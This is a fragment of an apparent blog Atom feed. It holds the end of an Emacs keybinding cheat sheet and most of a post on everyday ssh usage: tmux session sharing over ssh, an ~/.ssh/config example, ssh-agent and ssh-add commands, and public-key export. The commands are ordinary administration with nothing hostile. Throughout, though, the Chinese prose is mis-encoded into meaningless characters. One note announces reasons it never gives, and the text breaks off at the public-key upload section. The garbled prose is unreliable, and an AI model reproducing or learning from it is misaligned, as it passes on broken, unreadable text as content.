&lt;p>&lt;code>C-SPC C-SPC&lt;/code>
Set the mark, pushing it onto the mark ring, without activating it.&lt;/p>
&lt;p>&lt;code>C-u C-SPC&lt;/code>
Move point to where the mark was, and restore the mark from the ring of former marks.&lt;/p>
&lt;p>&lt;code>M-e&lt;/code> isearch-edit-string, edit the search string in the minibuffer when isearch is activated.&lt;/p>
&lt;p>&lt;code>M-.&lt;/code> &lt;code>xref-find-definitions&lt;/code> è·³åˆ°æ–¹æ³•ã€å˜é‡çš„å®šä¹‰å¤„&lt;/p>
&lt;p>&lt;code>M-,&lt;/code> &lt;code>xref-go-back&lt;/code> è·³å›å»&lt;/p>
&lt;p>&lt;code>M-?&lt;/code> &lt;code>xref-find-references&lt;/code> åˆ—å‡ºè¯¥ç¬¦å·çš„å¼•ç”¨å¤„&lt;/p>
&lt;p>&lt;code>C-c l&lt;/code> org-store-link&lt;/p>
&lt;h2 id="bookmark">Bookmark&lt;/h2>
&lt;p>&lt;code>C-x r m&lt;/code> - set a bookmark at the current location (e.g. in a file)
&lt;code>C-x r b&lt;/code> - jump to a bookmark
&lt;code>C-x r l&lt;/code> - list your bookmarks
&lt;code>M-x bookmark-delete&lt;/code> - delete a bookmark by name&lt;/p>
&lt;h2 id="macro">Macro&lt;/h2>
&lt;p>&lt;code>C-x (&lt;/code> Start recording macro
&lt;code>C-x )&lt;/code> End recording macro
&lt;code>C-x e&lt;/code> Run macro&lt;/p>
&lt;h2 id="mode">Mode&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>CC Mode
&lt;code>C-c .&lt;/code> c-set-style, switching CC Mode style&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>fido-mode&lt;/code>&lt;/p>
&lt;ul>
&lt;li>è¯¥æ¨¡å¼å¼€å¯æ—¶ï¼Œåœ¨æ‰§è¡Œ &lt;code>make-directory&lt;/code> æ—¶ï¼Œè¦åˆ›å»ºçš„ç›®å½•å¾ˆå®¹æ˜“åŒ¹é…åˆ°æ–‡ä»¶åå¯¼è‡´æ— æ³•åˆ›å»ºï¼Œè¿™æ—¶å¯ä»¥è¾“å…¥æ–‡ä»¶åï¼Œå¹¶ç›´æ¥æŒ‰ä¸‹ &lt;code>M-j&lt;/code> å³å¯ç«‹å³åˆ›å»ºè¯¥æ–‡ä»¶å¤¹ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>hl-line-mode&lt;/code> é«˜äº®å½“å‰è¡Œ&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="ç‰¹æ®Šå­—ç¬¦">ç‰¹æ®Šå­—ç¬¦&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>&lt;code>C-x 8 R&lt;/code>&lt;/strong>Â è¾“å…¥ Â®&lt;/li>
&lt;li>Â &lt;strong>&lt;code>C-x 8 o&lt;/code>&lt;/strong>Â è¾“å…¥ Â°&lt;/li>
&lt;li>Â &lt;strong>&lt;code>C-x 8 C-h&lt;/code>&lt;/strong>Â è·å¾—ä¸€ä»½å®Œæ•´çš„åˆ—è¡¨&lt;/li>
&lt;/ul>
&lt;h2 id="å¸®åŠ©æ–‡æ¡£">å¸®åŠ©æ–‡æ¡£&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>&lt;code>C-h f&lt;/code>&lt;/strong>Â æŸ¥çœ‹æŸä¸ªå‡½æ•°çš„æ–‡æ¡£&lt;/li>
&lt;li>&lt;strong>&lt;code>C-h v&lt;/code>&lt;/strong>Â æŸ¥çœ‹æŸä¸ªå˜é‡çš„æ–‡æ¡£&lt;/li>
&lt;li>&lt;strong>&lt;code>C-h a&lt;/code>&lt;/strong>Â ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æŸ¥æ‰¾å‘½ä»¤ï¼ˆ**&lt;code>M-x apropos&lt;/code>**å¯æŸ¥æ‰¾å‡½æ•°æˆ–å˜é‡ï¼‰&lt;/li>
&lt;li>&lt;strong>&lt;code>C-h k&lt;/code>&lt;/strong>Â æŸ¥çœ‹å¿«æ·é”®ç»‘å®šçš„å‘½ä»¤&lt;/li>
&lt;li>&lt;strong>&lt;code>C-h l&lt;/code>&lt;/strong>Â æ˜¾ç¤ºæœ€è¿‘çš„ 100 ä¸ªé”®å…¥åŠ¨ä½œ&lt;/li>
&lt;li>&lt;strong>&lt;code>C-h m&lt;/code>&lt;/strong>Â æè¿°å½“å‰çš„ mode&lt;/li>
&lt;li>&lt;strong>&lt;code>C-h i&lt;/code>&lt;/strong>Â æŸ¥çœ‹ info æ–‡æ¡£&lt;/li>
&lt;li>&lt;strong>&lt;code>C-h C-h&lt;/code>&lt;/strong> è·å–å®Œæ•´åˆ—è¡¨&lt;/li>
&lt;/ul></content><category scheme="https://mincodes.com/tags/emacs/" term="Emacs" label="Emacs"/><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/><category scheme="https://mincodes.com/tags/editor/" term="Editor" label="Editor"/></entry><entry><title type="text">ssh å¸¸è§ç”¨æ³•ä»‹ç»</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/ssh-usage/"/><id>https://mincodes.com/posts/ssh-usage/</id><updated>2023-06-17T10:14:00+00:00</updated><published>2022-11-15T08:27:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">ssh æ˜¯å¹³æ—¶ååˆ†å¸¸ç”¨çš„å·¥å…·ï¼Œè¿™é‡Œè®°å½•ä¸€äº›å¸¸è§ç”¨æ³•ã€‚ ä¸€äº›èŠ±æ ·ç©æ³• é€šè¿‡ ssh å…±äº« tmux session remote machine: tmux -S /tmp/shared-tmux-socket new-session local machine: ssh -t remote-machine tmux -S /tmp/shared-tmux-socketâ€¦</summary><content type="html">&lt;p>ssh æ˜¯å¹³æ—¶ååˆ†å¸¸ç”¨çš„å·¥å…·ï¼Œè¿™é‡Œè®°å½•ä¸€äº›å¸¸è§ç”¨æ³•ã€‚&lt;/p>
&lt;h2 id="ä¸€äº›èŠ±æ ·ç©æ³•">ä¸€äº›èŠ±æ ·ç©æ³•&lt;/h2>
&lt;h3 id="é€šè¿‡-ssh-å…±äº«-tmux-session">é€šè¿‡ ssh å…±äº« tmux session&lt;/h3>
&lt;ul>
&lt;li>remote machine: &lt;code>tmux -S /tmp/shared-tmux-socket new-session&lt;/code>&lt;/li>
&lt;li>local machine: &lt;code>ssh -t remote-machine tmux -S /tmp/shared-tmux-socket attach&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>é€šè¿‡ä¸Šé¢ç®€å•ä¸¤æ­¥ï¼Œå°±å¯ä»¥é€šè¿‡ ssh è¿œç¨‹è¿œç¨‹å…±äº« tmux session äº†ã€‚&lt;/p>
&lt;p>è·Ÿæ™®é€šçš„ ssh ç™»å½•ä¸Šå»å† tmux è¿˜æ˜¯æœ‰ä¸€å®šåŒºåˆ«çš„ï¼Œå…¶ä¸­æœ€å¤§çš„åŒºåˆ«ï¼Œæ˜¯æœ¬åœ°ã€è¿œç¨‹èƒ½åŒæ—¶çœ‹åˆ°è¿™ä¸ª sessionï¼ŒåŒ…æ‹¬ä½ åœ¨ tmux é‡Œé¢æ•²çš„æ¯ä¸ªå‘½ä»¤ï¼Œä»¥åŠç»ˆç«¯çš„æ‰€æœ‰è¾“å‡ºï¼Œéƒ½æ˜¯å®æ—¶åŒæ­¥çš„ï¼Œæœ‰ç‚¹ã€Œç»ˆç«¯ç‰ˆæœ¬çš„æ¡Œé¢å…±äº«ã€çš„æ„æ€ã€‚æ„Ÿè§‰ç”¨æ¥åšè¿œç¨‹æ•™å­¦æŒºæ–¹ä¾¿çš„ã€‚&lt;/p>
&lt;h2 id="ssh-å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶">ssh å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶&lt;/h2>
&lt;p>é€šå¸¸æˆ‘ä»¬åœ¨è¿æ¥ä¸åŒçš„æœåŠ¡å™¨æ—¶ï¼Œéœ€è¦ä½¿ç”¨ä¸åŒçš„å‚æ•°ã€‚ä¾‹å¦‚æœ€å¸¸è§çš„ç”¨æˆ·åä¸
åŒã€ç«¯å£ä¸åŒã€ç§é’¥ä¸åŒç­‰ã€‚è¿™æ—¶å¯ä»¥é…ç½® &lt;code>~/.ssh/config&lt;/code> æ–‡ä»¶ï¼ŒæŒ‰ç…§ä¸åŒ
çš„æœåŠ¡å™¨ï¼Œåˆ—å‡ºå„è‡ªçš„å‚æ•°ï¼Œé¿å…æ¯æ¬¡ç™»é™†æ—¶éƒ½éœ€è¦é‡å¤è¾“å…¥è¿™äº›å‚æ•°ã€‚&lt;/p>
&lt;p>å¸¸ç”¨é…ç½®ç¤ºä¾‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ~/.ssh/config&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host *
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Port &lt;span class="m">1234&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># æ˜¯å¦å‹ç¼©&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Compression yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># åœ¨ç»™å®šç§’æ•°å†…ï¼Œæ²¡æ”¶åˆ°æœåŠ¡å™¨æ•°æ®ï¼Œåˆ™å‘æœåŠ¡å™¨è¯·æ±‚ä¸€ä¸ªå›åŒ…ï¼Œå¯ç”¨äºè¿æ¥ä¿æ´»&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ServerAliveInterval &lt;span class="m">60&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ç¦æ­¢å‘é€ TCP keepalive æ¶ˆæ¯ï¼Œé¿å…ä¸´æ—¶ç½‘ç»œä¸­æ–­å¼•èµ·è¿æ¥ä¸­æ–­&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TCPKeepAlive no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host svr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> HostName svr.example.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> User tom
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Port &lt;span class="m">2222&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> IdentityFile ~/.ssh/id_rsa-svr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># æŒ‡å®šæœ¬æœº IP åœ°å€&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> BindAddress 192.168.10.235
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ›´å¤šé…ç½®å¯å‚è€ƒ &lt;code>man ssh_config&lt;/code> ã€‚&lt;/p>
&lt;p>Tips:&lt;/p>
&lt;ul>
&lt;li>å¦‚æœè¦ç§»é™¤ä¸€ä¸ªè¿‡æœŸäº†çš„æœåŠ¡å™¨æŒ‡çº¹ï¼ˆä¾‹å¦‚é‡åˆ° &lt;code>WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!&lt;/code> çš„è­¦å‘Šï¼‰ï¼Œå¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤ï¼š &lt;code>ssh-keygen -R github.com&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="ssh-agent">ssh-agent&lt;/h2>
&lt;p>å¦‚æœç§é’¥è®¾ç½®äº†å¯†ç ï¼Œæ¯æ¬¡ç™»é™†éƒ½éœ€è¦è¾“å…¥å¯†ç ï¼Œæ¯”è¾ƒéº»çƒ¦ã€‚ &lt;code>ssh-agent&lt;/code> å¯
ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ssh-agent å…è®¸åœ¨æ•´ä¸ª session ä¸­ï¼Œåªè¾“å…¥ä¸€æ¬¡å¯†ç ã€‚&lt;/p>
&lt;h3 id="å»ºç«‹-session">å»ºç«‹ session&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å¼€æ–°çš„ shell å¹¶å¯ç”¨ ssh-agent, bash å¯ä»¥æ¢æˆ zsh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-agent bash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åœ¨å½“å‰ shell ä¸‹å¯ç”¨ ssh-agent&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">eval&lt;/span> &lt;span class="sb">`&lt;/span>ssh-agent&lt;span class="sb">`&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># é€€å‡º ssh-agent&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-agent -k
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="æ·»åŠ ç§é’¥">æ·»åŠ ç§é’¥&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ·»åŠ é»˜è®¤ç§é’¥ï¼ŒæŒ‰ç…§æç¤ºè¾“å…¥å¯†ç ï¼ˆpassphraseï¼‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-add
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ·»åŠ æŒ‡å®šçš„ç§é’¥&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-add ~/.ssh/id_rsa-svr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åˆ—å‡ºæ‰€æœ‰å·²æ·»åŠ çš„ç§é’¥&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-add -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ä»å†…å­˜ä¸­ç§»é™¤æŒ‡å®šçš„ç§é’¥&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-add -d ~/.ssh/id_rsa-svr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ä»å†…å­˜ä¸­åˆ é™¤æ‰€æœ‰å·²æ·»åŠ çš„ç§é’¥&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-add -D
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="é€šè¿‡ç§é’¥å¯¼å‡ºå…¬é’¥">é€šè¿‡ç§é’¥å¯¼å‡ºå…¬é’¥&lt;/h3>
&lt;p>æœ‰æ—¶å€™æˆ‘ä»¬åªæœ‰ç§é’¥æ–‡ä»¶ï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¯¼å‡ºå…¶å¯¹åº”çš„å…¬é’¥ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh-keygen -y -f ~/.ssh/id_rsa
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="eval-ssh-agent-æˆ–-eval-ssh-agent-çš„ä¸€ç‚¹è§£é‡Š">eval &lt;code>ssh-agent&lt;/code> æˆ– eval &amp;ldquo;$(ssh-agent)&amp;rdquo; çš„ä¸€ç‚¹è§£é‡Š&lt;/h3>
&lt;p>åœ¨è¿è¡Œ ssh-agent çš„æ—¶å€™ï¼Œä¸€èˆ¬ä½¿ç”¨ &lt;code>eval &lt;/code>ssh-agent&lt;code>æˆ–&lt;/code>eval &amp;ldquo;$(ssh-agent)&amp;quot;`` ï¼Œè€Œä¸æ˜¯ç›´æ¥è¿è¡Œ ssh-agentï¼Œä»€ä¹ˆåŸå› å‘¢ï¼Ÿ&lt;/p>
&lt;p>å½“ä½ ç›´æ¥è¿è¡Œ &lt;code>ssh-agent&lt;/code> æ—¶ï¼Œå®ƒä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„ä»£ç†è¿›ç¨‹å¹¶è¾“å‡ºä¸€äº›ç¯å¢ƒå˜é‡ï¼ˆæ‰“å°åˆ°æ ‡å‡†è¾“å‡ºï¼‰ï¼Œä¾‹å¦‚ &lt;code>SSH_AGENT_PID&lt;/code> å’Œ &lt;code>SSH_AUTH_SOCK&lt;/code>ã€‚è¿™äº›ç¯å¢ƒå˜é‡ç”¨äºå‘Šè¯‰ SSH å®¢æˆ·ç«¯å¦‚ä½•ä¸ä»£ç†è¿›ç¨‹è¿›è¡Œé€šä¿¡ã€‚ç„¶è€Œï¼Œç›´æ¥è¿è¡Œ &lt;code>ssh-agent&lt;/code> å¹¶ä¸ä¼šè®¾ç½®è¿™äº›ç¯å¢ƒå˜é‡ï¼Œå®ƒä»¬åªä¼šè¢«è¾“å‡ºåˆ°ç»ˆç«¯ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ ssh-agent
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SSH_AUTH_SOCK&lt;/span>&lt;span class="o">=&lt;/span>/tmp/ssh-xxxxxxxxxx/agent.12345&lt;span class="p">;&lt;/span> &lt;span class="nb">export&lt;/span> SSH_AUTH_SOCK&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SSH_AGENT_PID&lt;/span>&lt;span class="o">=&lt;/span>12345&lt;span class="p">;&lt;/span> &lt;span class="nb">export&lt;/span> SSH_AGENT_PID&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> Agent pid 12345&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç›¸åï¼Œå½“ä½ ä½¿ç”¨ &lt;code>eval &amp;quot;$(ssh-agent)&amp;quot;&lt;/code> æ—¶ï¼Œ&lt;code>eval&lt;/code> å‘½ä»¤ä¼šè§£æå¹¶æ‰§è¡Œ &lt;code>ssh-agent&lt;/code> è¾“å‡ºçš„ç¯å¢ƒå˜é‡è®¾ç½®å‘½ä»¤ã€‚è¿™æ ·ï¼Œç¯å¢ƒå˜é‡å°±ä¼šè¢«æ­£ç¡®è®¾ç½®ï¼ŒSSH å®¢æˆ·ç«¯å°±èƒ½ä¸ä»£ç†è¿›ç¨‹è¿›è¡Œé€šä¿¡ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ &lt;span class="nb">eval&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="k">$(&lt;/span>ssh-agent&lt;span class="k">)&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Agent pid &lt;span class="m">12345&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ€»ä¹‹ï¼Œä½¿ç”¨ &lt;code>eval &amp;quot;$(ssh-agent)&amp;quot;&lt;/code> èƒ½ç¡®ä¿ SSH å®¢æˆ·ç«¯èƒ½å¤Ÿæ­£ç¡®è¯†åˆ«å¹¶ä½¿ç”¨ä»£ç†è¿›ç¨‹ï¼Œè€Œç›´æ¥è¿è¡Œ &lt;code>ssh-agent&lt;/code> åªä¼šè¾“å‡ºç¯å¢ƒå˜é‡ï¼Œè€Œä¸ä¼šå°†å®ƒä»¬è®¾ç½®åˆ°å½“å‰ shell ç¯å¢ƒä¸­ã€‚ä¸ºäº†ç¡®ä¿ &lt;code>ssh-agent&lt;/code> èƒ½æ­£å¸¸å·¥ä½œï¼Œå»ºè®®ä½¿ç”¨ &lt;code>eval &amp;quot;$(ssh-agent)&amp;quot;&lt;/code> å‘½ä»¤å¯åŠ¨å®ƒã€‚&lt;/p>
&lt;h3 id="å¦‚ä½•è‡ªåŠ¨è¿è¡Œ-ssh-agent">å¦‚ä½•è‡ªåŠ¨è¿è¡Œ ssh-agent&lt;/h3>
&lt;p>å¯ä»¥å°† &lt;code>eval &amp;quot;$(ssh-agent)&amp;quot;&lt;/code> æ·»åŠ åˆ° &lt;code>~/.bash_profile&lt;/code> æˆ– &lt;code>~/.profile&lt;/code> æ–‡ä»¶ä¸­ï¼ˆå–å†³äºä½ çš„ç³»ç»Ÿé…ç½®ï¼‰ã€‚è¿™äº›æ–‡ä»¶ä»…åœ¨ç™»å½•æ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…é‡å¤å¯åŠ¨ &lt;code>ssh-agent&lt;/code>ã€‚&lt;/p>
&lt;blockquote>
&lt;p>æ³¨æ„ï¼Œè¯·ä¸è¦åœ¨ &lt;code>~/.bashrc&lt;/code> æ–‡ä»¶ä¸­æ·»åŠ  &lt;code>eval &amp;quot;$(ssh-agent)&amp;quot;&lt;/code> åŸå› å¦‚ä¸‹ï¼š&lt;/p>
&lt;/blockquote>
&lt;p>ç„¶åï¼Œä½ éœ€è¦ç¡®ä¿ &lt;code>~/.bashrc&lt;/code> æˆ–å…¶ä»–ä¼šè¯åˆå§‹åŒ–è„šæœ¬ä¸­åŒ…å«ä»¥ä¸‹ä»£ç ï¼Œä»¥ä¾¿åœ¨æ–°çš„ shell ä¼šè¯ä¸­ç»§æ‰¿çˆ¶ä¼šè¯çš„ç¯å¢ƒå˜é‡ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -n &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$SSH_AUTH_SOCK&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">export&lt;/span> SSH_AUTH_SOCK
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -n &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$SSH_AGENT_PID&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">export&lt;/span> SSH_AGENT_PID
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">fi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿™æ ·ï¼Œåœ¨ç™»å½•æ—¶å¯åŠ¨çš„ &lt;code>ssh-agent&lt;/code> å®ä¾‹å°†åœ¨æ‰€æœ‰æ–°çš„ shell ä¼šè¯ä¸­å¯ç”¨ï¼Œè€Œä¸ä¼šå¯åŠ¨é¢å¤–çš„ä»£ç†è¿›ç¨‹ã€‚&lt;/p>
&lt;h2 id="ä¸Šä¼ å…¬é’¥">ä¸Šä¼ å…¬é’¥&lt;/h2>
&lt;p>ä¸Šä¼ å…¬é’¥æœ‰ä¸¤ç§æ–¹å¼ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>åˆ©ç”¨ &lt;code>ssh-copy-id&lt;/code> å‘½ä»¤&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
